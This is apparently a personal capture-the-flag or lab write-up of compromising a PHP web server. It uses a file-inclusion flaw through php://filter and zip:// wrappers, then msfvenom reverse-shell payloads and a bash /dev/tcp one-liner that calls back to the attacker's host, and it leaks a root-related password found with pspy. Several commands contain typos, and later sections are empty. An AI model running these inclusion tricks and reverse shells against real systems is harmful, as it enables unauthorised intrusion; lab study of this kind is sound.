#Pwned! 
```IP
192.168.213.229
```
# Enumeration

## HTTP
file upload

# Exploitation

```
ffuf -u 'http://192.168.213.229/index.php?file=php://filter/convert.base64-encode/resource=FUZZ' -w /usr/share/seclists/Discovery/Web-Con
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203160149.png?raw=true)
seems like it is adding .php to its resources, so we can access it just by typing 'upload' for example
```
http://192.168.213.229/index.php?file=php://filter/convert.base64-encode/resource=upload
```
we can review the code by decoding it
```
cat upload64| base64 -d
```
we create our shell as follows:
```
msfvenom -p php/reverse_php LHOST=192.168.45.176 LPORT=9001 -o shell.php
```
we upload it and intercept it to see the zip name

Executing the shell with a zip filter as shown in https://book.hacktricks.xyz/pentesting-web/file-inclusion#zip-and-rar

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203163728.png?raw=true)

```
/index.php?file=zip:///var/www/html/uploads/upload_1733238807.zip%23shell
```
```
/bin/bash -i >& /dev/tcp/ 192.168.45.176/4444 0>&1
```

since I was struggling to upgrade this php reverse shell, I just imported a new one created with msfvenom
```
sfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f elf > shell.elf
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203164727.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203164751.png?raw=true)


# PrivEsc

## Manual

we find something interesting in /opt
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203165123.png?raw=true)
seems like it is getting a password from /root
then removes all .tmp files from /var/www/html/uploads
then adds the files from backup.zip to some logs???
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203165253.png?raw=true)

maybe running pspy we can get this command in real time
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203165948.png?raw=true)
```
WildCardsGoingWild
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203170122.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

